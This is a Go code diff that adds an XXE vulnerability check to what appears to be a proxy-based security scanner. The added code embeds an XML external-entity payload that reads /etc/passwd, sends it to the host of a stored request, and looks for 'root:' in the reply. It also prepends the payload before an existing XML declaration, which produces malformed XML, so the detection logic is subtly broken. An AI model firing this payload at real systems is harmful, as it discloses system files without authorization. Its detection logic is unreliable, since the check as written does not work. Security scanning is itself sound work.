@@ -1,10 +1,11 @@
-// api/handlers.go
 package api
 
 import (
+	"bytes"
 	"encoding/json"
 	"fmt"
 	"github.com/gorilla/mux"
+	"io/ioutil"
 	"net/http"
 	"proxy-scanner/proxy"
 	"strings"
@@ -23,8 +24,8 @@ func (h *APIHandler) scanRequest(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	reqData, exists := h.store.Get(id)
-	if !exists {
+	reqData, exists := h.store.GetRequest(id)
+	if exists != nil {
 		http.Error(w, "Request not found", http.StatusNotFound)
 		return
 	}
@@ -91,4 +92,83 @@ func (h *APIHandler) scanForVulnerabilities(reqData *proxy.RequestData) []Vulner
 	}
 
 	return vulnerabilities
+}
+
+func checkForXXE(req *http.Request) error {
+	body, err := ioutil.ReadAll(req.Body)
+	if err != nil {
+		return fmt.Errorf("failed to read request body: %v", err)
+	}
+
+	req.Body = ioutil.NopCloser(bytes.NewReader(body))
+
+	if strings.HasPrefix(string(body), "<?xml") {
+		xxePayload := `<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<foo>&xxe;</foo>`
+
+		body = append([]byte(xxePayload), body...)
+		req.Body = ioutil.NopCloser(bytes.NewReader(body))
+	}
+	return nil
+}
+
+func checkXXEVulnerability(req *http.Request) (bool, error) {
+	client := &http.Client{}
+
+	if err := checkForXXE(req); err != nil {
+		return false, fmt.Errorf("failed to modify request for XXE: %v", err)
+	}
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return false, fmt.Errorf("request failed: %v", err)
+	}
+	defer resp.Body.Close()
+
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return false, fmt.Errorf("failed to read response body: %v", err)
+	}
+
+	if strings.Contains(string(body), "root:") {
+		return true, nil
+	}
+
+	return false, nil
+}
+
+func (h *APIHandler) checkRequestForXXE(w http.ResponseWriter, r *http.Request) {
+	id := mux.Vars(r)["id"]
+	if id == "" {
+		http.Error(w, "ID parameter is required", http.StatusBadRequest)
+		return
+	}
+
+	req, err := h.store.GetRequest(id)
+	if err != nil {
+		http.Error(w, "Request not found", http.StatusNotFound)
+		return
+	}
+
+	httpReq, err := http.NewRequest(req.Parsed.Method, req.Parsed.Scheme+"://"+req.Parsed.Host+req.Parsed.Path, bytes.NewReader(req.Parsed.RawBody))
+	if err != nil {
+		http.Error(w, "Failed to create HTTP request: "+err.Error(), http.StatusInternalServerError)
+		return
+	}
+
+	isVulnerable, err := checkXXEVulnerability(httpReq)
+	if err != nil {
+		http.Error(w, "Error checking for XXE vulnerability: "+err.Error(), http.StatusInternalServerError)
+		return
+	}
+
+	if isVulnerable {
+		w.WriteHeader(http.StatusOK)
+		w.Write([]byte("Request is vulnerable to XXE"))
+	} else {
+		w.WriteHeader(http.StatusOK)
+		w.Write([]byte("Request is not vulnerable to XXE"))
+	}
 }
